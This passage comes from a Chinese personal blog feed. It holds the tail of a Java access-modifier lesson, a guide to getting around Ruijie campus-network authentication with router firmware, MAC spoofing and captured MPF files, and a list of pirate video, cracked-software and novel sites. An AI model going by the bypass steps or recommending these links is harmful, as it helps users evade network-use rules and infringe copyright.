comment">// 自己可以访问</span> <span class="token comment">// 同包子类可以继承</span><span class="token comment">// 不同包子类不能继承</span> <span class="token comment">// 同包类可以访问</span><span class="token comment">// 不同包类不能访问</span><span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protected-受保护的"><a href="#protected-受保护的" class="headerlink" title="protected 受保护的"></a>protected 受保护的</h4><p>受保护的修饰符<br>protected float hp; 血量</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/610.jpg" alt="610" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token comment">// protected饰符的属性 hp</span>    <span class="token comment">// 自己可以访问</span>     <span class="token comment">// 同包子类可以继承</span>    <span class="token comment">// 不同包子类可以继承</span>     <span class="token comment">// 同包类可以访问</span>    <span class="token comment">// 不同包类不能访问</span>    <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="public-公共的"><a href="#public-公共的" class="headerlink" title="public 公共的"></a>public 公共的</h4><p>公共的修饰符<br>public String name; 姓名<br>任何地方，都可以访问</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/611.jpg" alt="611" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// public的属性 name</span><span class="token comment">// 自己可以访问</span> <span class="token comment">// 同包子类可以继承</span><span class="token comment">// 不同包子类可以继承</span> <span class="token comment">// 同包类可以访问</span><span class="token comment">// 不同包类可以访问</span><span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/612.jpg" alt="612" loading="lazy"></p><h4 id="使用总结"><a href="#使用总结" class="headerlink" title="使用总结"></a>使用总结</h4><p>那么什么情况该用什么修饰符呢？<br>从作用域来看，public能够使用所有的情况。 但是大家在工作的时候，又不会真正全部都使用public,那么到底什么情况该用什么修饰符呢？</p><ol><li>属性通常使用private封装起来</li><li>方法一般使用public用于被调用</li><li>会被子类继承的方法，通常使用protected</li><li>package用的不多，一般新手会用package,因为还不知道有修饰符这个东西</li></ol><p>再就是<strong>作用范围最小原则</strong><br>简单说，能用private就用private，不行就放大一级，用package,再不行就用protected，最后用public。 这样就能把数据尽量的封装起来，没有必要<strong>露出来的</strong>，就不用<strong>露出来</strong>了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java学习" scheme="http://www.blog.yln956.top/categories/java%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="java" scheme="http://www.blog.yln956.top/tags/java/"/>
    
    <category term="学习" scheme="http://www.blog.yln956.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>老毛子搞定锐捷认证</title>
    <link href="http://www.blog.yln956.top/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/"/>
    <id>http://www.blog.yln956.top/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/</id>
    <published>2020-11-28T09:13:41.000Z</published>
    <updated>2020-11-28T15:58:44.794Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h2><p>原理很简单，就是把官方的认证放到路由器上，用路由器伪装自己的电脑登录账号，然后再把网络分享出来。学校的校园网客户端一般都是不给开热点的，主要是为了多卖多恰钱，懂得都懂。</p><h2 id="老毛子认证过程"><a href="#老毛子认证过程" class="headerlink" title="老毛子认证过程"></a>老毛子认证过程</h2><h3 id="一共就这下年4个步骤按照顺序来就肯定可以用"><a href="#一共就这下年4个步骤按照顺序来就肯定可以用" class="headerlink" title="!!!一共就这下年4个步骤按照顺序来就肯定可以用"></a>!!!一共就这下年4个步骤按照顺序来就肯定可以用</h3><h5 id="刷好老毛子固件"><a href="#刷好老毛子固件" class="headerlink" title="刷好老毛子固件"></a>刷好老毛子固件</h5><h5 id="伪装mac-伪装成你的电脑"><a href="#伪装mac-伪装成你的电脑" class="headerlink" title="伪装mac,伪装成你的电脑"></a>伪装mac,伪装成你的电脑</h5><h5 id="打开ssh-把mpf文件传进起来"><a href="#打开ssh-把mpf文件传进起来" class="headerlink" title="打开ssh, 把mpf文件传进起来"></a>打开ssh, 把mpf文件传进起来</h5><p>PS:mpf文件就是抓官方认证程序的认证的通讯协议的一个文件<br>这里传一个成都信息工程大学的mpf文件还有抓包软件<a href="http://file.skywang.fun/mpf%E6%8A%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E4%BB%A5%E5%8F%8ACUIT%E7%9A%84mpf%E6%96%87%E4%BB%B6.7z">cuit的移动, 电信, 联通的mpf认证文件</a></p><h5 id="输入账号密码连接"><a href="#输入账号密码连接" class="headerlink" title="输入账号密码连接."></a>输入账号密码连接.</h5><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h4 id="伪装Mac"><a href="#伪装Mac" class="headerlink" title="伪装Mac"></a>伪装Mac</h4><p>首先用自己的电脑插上网线，连接上客户端，查看mac地址</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128211809100.png" alt="image-20201128211809100" loading="lazy"></p><p>然后进入老毛子的后台，在这个位置伪装</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128211916301.png" alt="image-20201128211916301" loading="lazy"></p><h4 id="打开ssh-把mpf文件传进起来-1"><a href="#打开ssh-把mpf文件传进起来-1" class="headerlink" title="打开ssh, 把mpf文件传进起来"></a>打开ssh, 把mpf文件传进起来</h4><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212028903.png" alt="image-20201128212028903" loading="lazy"></p><p>这里我用的是WINSCP,选择SCP模式主机名字就是路由器后台地址，用户名密码就是后台登录的用户名密码</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212400835.png" alt="image-20201128212400835" loading="lazy"></p><p>连接上后把抓包到的MPF文件传到/etc/storage这个目录</p><p>之前已经附上成都信息工程大学的移动还有联通的mpf文件, 以及一个抓包软件, 不同学校的同学自己抓就行了</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212609567.png" alt="image-20201128212609567" loading="lazy"></p><p>然后进路由器后台，保存一下</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212718027.png" alt="image-20201128212718027" loading="lazy"></p><h2 id="输入账号密码连接-1"><a href="#输入账号密码连接-1" class="headerlink" title="输入账号密码连接"></a>输入账号密码连接</h2><p>输入账号密码</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128212958797.png" alt="image-20201128212958797" loading="lazy"></p><p>然后下面这么设置（这是成都信息工程大学的设置方法，其他的学校DHCP设置可能要改）</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128213222096.png" alt="image-20201128213222096" loading="lazy"></p><p>然后小地球亮了就是连接好了</p><p><img src="/2020/11/28/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/image-20201128213319350.png" alt="image-20201128213319350" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="老毛子搞定锐捷认证" scheme="http://www.blog.yln956.top/categories/%E8%80%81%E6%AF%9B%E5%AD%90%E6%90%9E%E5%AE%9A%E9%94%90%E6%8D%B7%E8%AE%A4%E8%AF%81/"/>
    
    
    <category term="好东西" scheme="http://www.blog.yln956.top/tags/%E5%A5%BD%E4%B8%9C%E8%A5%BF/"/>
    
    <category term="校园网破解" scheme="http://www.blog.yln956.top/tags/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="路由器" scheme="http://www.blog.yln956.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>收集的一些网站（不定期更新）</title>
    <link href="http://www.blog.yln956.top/2020/11/22/%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>http://www.blog.yln956.top/2020/11/22/%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2020-11-22T14:16:50.000Z</published>
    <updated>2020-12-06T02:25:27.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><div id="binft"></div> <script>   var binft = function (r) {     function t() {       return b[Math.floor(Math.random() * b.length)]     }       function e() {       return String.fromCharCode(94 * Math.random() + 33)     }     function n(r) {       for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {         var l = document.createElement("span");         l.textContent = e(), l.style.color = t(), n.appendChild(l)       }       return n     }     function i() {       var t = o[c.skillI];       c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)     }     var l = "",     o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {     return r + ""     }),     a = 2,     g = 1,     s = 5,     d = 75,     b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],     c = {       text: "",       prefixP: -s,       skillI: 0,       skillP: 0,       direction: "forward",       delay: a,       step: g     };     i()     };     binft(document.getElementById('binft')); </script><p>分享一些特殊的网站<br><strong>持续更新</strong><br><a href="#website">欢迎在下方留言补充更多网站</a></p></blockquote><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>定期处理失效链接</p><h3 id="在线视频"><a href="#在线视频" class="headerlink" title="在线视频"></a>在线视频</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请使用<strong>正版视频</strong>软件，支持正版人人有责</p></blockquote><p>最近迷上了 TVB 的几部经典的金庸剧，找了一圈资源，唯独优酷的视频清晰度最高，而且还流畅。所以有些时候啊，会员该充还是要充，别白嫖嫖习惯了</p><p>剧荒的小伙伴，可以看看<a href="http://1090ys.com/show/1836.html">豆瓣电影top250</a> ，刷刷经典电影，<a href="http://1090ys.com/">1090影视</a> 的站长辛苦整理，都是高清片源，挺不容易的，好东西就应该支持一波，还有各种豆瓣合集在线观看</p><h4 id="无广告-正常广告"><a href="#无广告-正常广告" class="headerlink" title="无广告 / 正常广告"></a>无广告 / 正常广告</h4><blockquote><p>越来越多的网站都有了广告，这也是没办法的事，且用且珍惜</p></blockquote><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="http://www.novipnoad.com/"><strong>NO 视频</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>无广告</code> <code>多个字幕组</code> <code>更新速度快</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://ddrk.me/"><strong>低端影视</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>有广告</code> <code>字幕质量高</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://xijing.tv/"><strong>xijingtv</strong></a></td><td align="center"><strong>海外剧</strong></td><td align="center"><code>无广告</code> <code>可下载</code> <code>更新快</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="https://www.duboku.net/"><strong>独播库</strong></a></td><td align="center"><strong>全能 / 海外</strong></td><td align="center"><code>需要 FQ</code> <code>正常广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://www.mengmiandaxia.cn/"><strong>蒙面大侠</strong></a></td><td align="center"><strong>全能</strong></td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://www.paofans.net/"><strong>泡饭影视</strong></a></td><td align="center"><strong>全能</strong></td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code> <code>高清</code></td></tr><tr><td align="center"><a href="https://bde4.com/">哔嘀影视</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>高清资源</code> <code>资源全</code></td></tr><tr><td align="center"><a href="https://www.52dy.vip/">吾爱电影</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>高清资源</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="http://www.jiurenyu.top/">看趣视频</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.dililitv.com/">嘀喱喱</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.78zhuiju.com/">西瓜追剧</a></td><td align="center">全能 / 国产</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.snailok.com/">蜗牛视频</a></td><td align="center">全能 / 韩剧</td><td align="center"><code>无广告</code> <code>韩剧资源全</code></td></tr><tr><td align="center"><a href="https://www.taijumi.cc/">泰剧迷</a></td><td align="center">泰剧</td><td align="center"><code>无广告</code> <code>资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="https://www.clicli.me/"><strong>clicli</strong></a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code> <code>画质高</code></td></tr><tr><td align="center"><a href="https://www.agefans.tv/">AGE 动漫</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫资源全</code> <code>更新快</code> <code>加载快</code></td></tr><tr><td align="center"><a href="http://www.zzzfun.com/">ZzzFun</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code></td></tr><tr><td align="center"><a href="http://www.bimibimi.tv/">哔咪哔咪</a></td><td align="center">动漫</td><td align="center"><code>无广告</code> <code>日漫国漫资源全</code> <code>更新快</code></td></tr></tbody></table><h4 id="棋牌-开车广告"><a href="#棋牌-开车广告" class="headerlink" title="棋牌 / 开车广告"></a>棋牌 / 开车广告</h4><p>赚钱也不容易，据说是网站只能接这种广告，谷歌广告审核通不过的</p><p>不过我实在很讨厌这种广告，我单独列个表吧，大家自行选择，有些网站更新也快，资源多，确实也还行</p><p>广告基本都出现在移动端，电脑端没有，也好屏蔽，最好是在电脑上使用</p><blockquote><p>Win/Mac 浏览器推荐 Chrome/ 火狐，安装扩展 <a href="https://orxing.top/post/acf529c5.html#%E6%89%A9%E5%B1%95%E6%8E%A8%E8%8D%90">uBlock Origin</a><br>Android 浏览器推荐<a href="https://www.coolapk.com/apk/com.qihoo.contents">极速浏览器</a><br>iOS 浏览器推荐 Alook<br>上述浏览器经过设置后可以完全过滤下列网站的广告</p></blockquote><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.nfmovies.com/"><strong>奈菲影视</strong></a></td><td align="center">全能 / 海外</td><td align="center"><code>有片头广告</code> <code>资源清晰度高</code> <code>资源相当全</code></td></tr><tr><td align="center"><a href="http://1090ys.com/"><strong>1090 影视</strong></a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>资源相当全</code></td></tr><tr><td align="center"><a href="https://www.wanmeikk.me/">完美看看</a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>热门资源全</code></td></tr><tr><td align="center"><a href="https://www.shenma4480.com/">神马影院</a></td><td align="center">全能 / 国产</td><td align="center"><code>有广告</code> <code>资源清晰度高</code> <code>热门资源全</code></td></tr></tbody></table><p>以下网站自行尝试筛选，如遇到链接失效，请自行搜索名字</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">网站</th><th align="center">分类</th></tr></thead><tbody><tr><td align="center"><a href="https://gimy.tv/">剧迷</a></td><td align="center">全能</td><td align="center"><a href="https://www.dixidixi.com/">dixidixi</a></td><td align="center">全能 / 国产</td></tr><tr><td align="center"><a href="https://www.tcmove.com/">太初电影</a></td><td align="center">全能 / 国产</td><td align="center"><a href="https://www.zxzj.me/">在线之家</a></td><td align="center">海外剧</td></tr><tr><td align="center"><a href="https://www.dybee.tv/">电影蜜蜂</a></td><td align="center">全能</td><td align="center"></td><td align="center"></td></tr></tbody></table><hr><h3 id="Onedrive-资源站"><a href="#Onedrive-资源站" class="headerlink" title="Onedrive_资源站"></a>Onedrive_资源站</h3><blockquote><p>Ondrive 提供一个很方便的 API 来搭建自己的私人云盘，而且 Onedrive 不限速，所以现在不少小伙伴都有了自己的资源站，并且将资源免费分享给大家<br><strong>可能需要自备梯子</strong></p></blockquote><p>这里我搜集了几个比较有特点的资源站，也欢迎小伙伴来分享</p><p>看有小伙伴需要梯子，目前来说，v2ray 的稳定性比较好。我个人用的免费梯子，要是想要可以加群找我（我是群主）群：172622261</p><p>鉴于这些网站经常失效，此板块不再更新</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://herokuonedrive.herokuapp.com/">某人の地盘</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>18 禁</code> <code>周杰伦无损全集</code></td></tr><tr><td align="center"><a href="https://storage.imouto.tech/home">季悠然の小仓库</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>Adobe 大师版</code> <code>PPT 模板</code></td></tr><tr><td align="center"><a href="http://qzyz.123yes.me/">Qif- 网络资源下载站</a></td><td align="center">综合</td><td align="center"><code>大量资源</code> <code>进击的巨人</code> <code>东京食尸鬼</code></td></tr><tr><td align="center"><a href="https://od.xxorg.com/">XXORG</a></td><td align="center">综合</td><td align="center"><code>樊登读书会</code> <code>大量机械工业出版社出版图书</code></td></tr><tr><td align="center"><a href="https://od.lezi.me/Study/">Jialezi</a></td><td align="center">综合</td><td align="center"><code>喜马拉雅音频</code> <code>大量机械工业出版社出版图书</code></td></tr><tr><td align="center"><a href="https://pan.macxin.com/">萌新云盘</a></td><td align="center">软件</td><td align="center"><code>专业软件</code> <code>Adobe 系列</code> <code>Autodesk 系列</code> <code>Matlab 系列</code></td></tr><tr><td align="center"><a href="https://filmindex.herokuapp.com/">Film_Index</a></td><td align="center">视频</td><td align="center"><code>豆瓣 Top250 所有电影</code> <code>真蓝光 1080P</code></td></tr><tr><td align="center"><a href="https://www.escaped.cn/oneindex/?/Movie">逃离の云盘</a></td><td align="center">视频</td><td align="center"><code>漫威宇宙</code></td></tr><tr><td align="center"><a href="https://lf.ztxdjj.me/">一盘</a></td><td align="center">番剧</td><td align="center"><code>里番：111111</code> <code>无修：333333</code></td></tr><tr><td align="center"><a href="https://pan.lifan.ooo/">里番</a></td><td align="center">视频</td><td align="center"><code>大量资源</code> <code>18 禁</code> <code>本子</code> <code>特摄</code></td></tr></tbody></table><hr><h3 id="破解软件"><a href="#破解软件" class="headerlink" title="破解软件"></a>破解软件</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请使用<strong>正版</strong>软件，支持正版人人有责</p></blockquote><p>破解软件这个圈吧，水有点深，有人将软件破解后自己加壳重新收费，有人甚至在里面加病毒，所以，百度上找破解软件大部分不安全</p><p>加粗网站我经常使用，可以放心使用，其余网站较少使用，但也相对安全</p><p><strong>破解软件的安全性特别重要，分享时请确保其安全性</strong></p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.mpyit.com/"><strong>殁漂遥</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">强烈推荐，推荐的软件都很实用，坚决不收费，配图有惊喜</td></tr><tr><td align="center"><a href="http://www.carrotchou.com/"><strong>胡萝卜周</strong></a></td><td align="center"><code>Windows</code> <code>macOS</code> <code>Android</code></td><td align="center">强烈推荐，比上面的软件要高级点</td></tr><tr><td align="center"><a href="https://www.ghpym.com/"><strong>果核剥壳</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">强烈推荐，比上面两个更新要快点</td></tr><tr><td align="center"><a href="https://www.52pojie.cn/">吾爱破解</a></td><td align="center"><code>全平台</code></td><td align="center">破解软件的摇篮，养活了一大批破解网站，但安全性不可知</td></tr><tr><td align="center"><a href="https://mp.weixin.qq.com/s/ZuKohAeMMHpQHq9yPp_3Gg">火耳软件安装</a></td><td align="center"><code>Windows</code></td><td align="center">提供各类专业软件安装包和安装教程</td></tr><tr><td align="center"><a href="https://hrtsea.com/"><strong>心海 e 站</strong></a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">安卓软件破解很出名</td></tr><tr><td align="center"><a href="https://www.appcgn.com/">软件缘</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色软件，其特点是下载地址很多</td></tr><tr><td align="center"><a href="https://portableappk.com/">绿色便携软件倡导者</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色软件，但是下载速度慢，部分软件需要付费下载</td></tr><tr><td align="center"><a href="https://orxing.top/post/[http://www.th-sjy.com](http://www.th-sjy.com/)">th_sjy 汉化博客</a></td><td align="center"><code>Windows</code></td><td align="center">主要是绿色汉化软件</td></tr><tr><td align="center"><a href="https://www.macdu.org/">mac 毒</a></td><td align="center"><code>macOS</code></td><td align="center">资源很多，但是有会员机制，大部分普通软件有百度云链接</td></tr><tr><td align="center"><a href="https://co6.cc/">Charm 城市女孩</a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">我更好奇站长到底是不是女孩</td></tr><tr><td align="center"><a href="https://www.cuiuc.com/">CUIUC</a></td><td align="center"><code>全平台</code></td><td align="center">更新较慢，软件种类很多</td></tr></tbody></table><hr><h3 id="免费小说"><a href="#免费小说" class="headerlink" title="免费小说"></a>免费小说</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请阅读<strong>正版</strong>小说，支持正版人人有责</p></blockquote><p>小说也是盗版重灾区，不过我平时不怎么看网络小说，对这块不怎么熟，希望大家踊跃分享网站</p><p>一般的盗版小说网站广告都很多，其实更推荐一些手机 app，可以重新排版，去广告，可以添加多个书源，体验要好很多，比如<a href="https://www.coolapk.com/apk/cn.deepink.reader">厚墨</a>，iOS 可以使用<a href="https://itunes.apple.com/cn/app/id1137819437">爱阅书香</a></p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.x23qb.com/"><strong>铅笔小说</strong></a></td><td align="center">网文</td><td align="center"><code>无广告</code> <code>阅读体验好</code></td></tr><tr><td align="center"><a href="https://www.daocaorenshuwu.com/">稻草人书屋</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.wanbentxt.com/">完本神站</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.9txs.com/">九桃小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="http://www.quanben.io/">全本小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.shenzhankanshu.com/">看书神站</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.meiguixs.net/">玫瑰小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.wenxuemi6.com/">文学迷</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://book.crazyideal.com/">吾的轻小说</a></td><td align="center">轻小说</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.qinxiaoshuo.com/">亲小说</a></td><td align="center">轻小说</td><td align="center"><code>无广告</code></td></tr></tbody></table><hr><h3 id="云盘搜索"><a href="#云盘搜索" class="headerlink" title="云盘搜索"></a>云盘搜索</h3><blockquote><p>请勿用来做非法用途<br>不更新此板块，失效请自行 Google</p></blockquote><p>现在的云盘搜索网站都搜不出什么好东西，实在垃圾，搜索到了下载还费劲，搞得我心力交瘁</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a 